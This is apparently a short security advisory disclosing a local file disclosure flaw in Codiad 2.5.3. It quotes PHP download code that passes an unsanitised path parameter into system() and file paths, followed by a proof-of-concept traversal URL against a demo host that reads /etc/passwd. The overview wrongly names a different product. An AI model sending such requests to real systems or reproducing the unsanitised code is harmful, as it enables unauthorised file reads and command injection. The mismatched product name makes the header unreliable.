@@ -1,0 +1,56 @@
+[+]Title: Codiad v2.5.3 - LFI Vulnerability
+[+]Author: TUNISIAN CYBER
+[+]Date: 12/03/2015
+[+]Type:WebApp
+[+]Risk:High
+[+]Overview:
+Pie Register 2.x suffers, from a Local File Disclosure vulnerability.
+ 
+[+]Proof Of Concept:
+
+[PHP]
+    //////////////////////////////////////////////////////////////////
+    // Run Download
+    //////////////////////////////////////////////////////////////////
+
+    if(isset($_GET['type']) && ($_GET['type']=='directory' || $_GET['type']=='root')){
+        // Create tarball
+        $filename = explode("/",$_GET['path']);
+        //$filename = array_pop($filename) . "-" . date('Y.m.d') . ".tar.gz";
+        $filename = array_pop($filename) . "-" . date('Y.m.d');
+        $targetPath = DATA . '/';
+        $dir = WORKSPACE . '/' . $_GET['path'];
+        if(!is_dir($dir)){
+        	exit('<script>parent.codiad.message.error("Directory not found.")</script>');
+        }
+
+        //////////////////////////////////////////////////////////////////
+        // Check system() command and a non windows OS
+        //////////////////////////////////////////////////////////////////
+        if(isAvailable('system') && stripos(PHP_OS, 'win') === false){
+          # Execute the tar command and save file
+          $filename .= '.tar.gz';
+
+          system("tar -pczf ".$targetPath.$filename." -C ".WORKSPACE." ".$_GET['path']);
+          $download_file = $targetPath.$filename;
+        }elseif(extension_loaded('zip')){ //Check if zip-Extension is availiable
+          //build zipfile
+          require_once 'class.dirzip.php';
+
+          $filename .= '.zip';
+          $download_file = $targetPath.$filename;
+          DirZip::zipDir($dir, $targetPath .$filename);
+        }else{
+          exit('<script>parent.codiad.message.error("Could not pack the folder, zip-extension missing")</script>');
+        }
+    }else{
+        $filename = explode("/",$_GET['path']);
+        $filename = array_pop($filename);
+        $download_file = WORKSPACE . '/' . $_GET['path'];
+    }
+[PHP]
+
+
+http://demo.codiad.com/i/197156553/components/filemanager/download.php?path=../../../../../../../../../../../etc/passwd&type=undefined
+
+
